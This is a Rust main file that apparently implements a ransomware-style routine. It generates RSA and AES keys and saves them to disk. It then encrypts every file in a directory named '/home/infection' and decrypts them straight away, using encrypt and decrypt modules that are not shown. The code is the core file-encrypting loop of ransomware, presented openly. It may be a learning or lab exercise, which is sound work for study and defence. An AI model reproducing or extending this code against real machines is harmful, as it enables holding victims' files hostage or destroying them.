use std::{
    fs::{self, File},
    io::Write,
    path::PathBuf,
};

use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};

mod decrypt;
mod encrypt;
mod generate_keys;

fn get_files_in_directory(path: &str) -> Vec<PathBuf> {
    let mut files = Vec::new();
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries {
            if entry.is_err() {
                continue;
            }
            files.push(entry.unwrap().path());
        }
    }
    files
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let (private_key, public_key, aes_key) = generate_keys::generate_keys()?;

    let mut private_key_file = File::create("private_key.der")?;
    let mut public_key_file = File::create("public_key.der")?;
    let mut encryption_key_file = File::create("encryption.key")?;

    private_key_file.write_all(private_key.to_pkcs1_der()?.as_bytes())?;
    public_key_file.write_all(public_key.to_pkcs1_der()?.as_bytes())?;

    let encrypted_aes_key = encrypt::encrypt_aes_key(&aes_key, &public_key)?;
    encryption_key_file.write_all(&encrypted_aes_key)?;

    let files = get_files_in_directory("/home/infection");
    for file in &files {
        encrypt::encrypt_file(file, &aes_key).unwrap();
    }

    let encrypted_files = get_files_in_directory("/home/infection");
    let decrypted_aes_key = decrypt::decrypt_aes_key()?;
    for file in &encrypted_files {
        decrypt::decrypt_file(file, &decrypted_aes_key).unwrap();
    }

    Ok(())
}
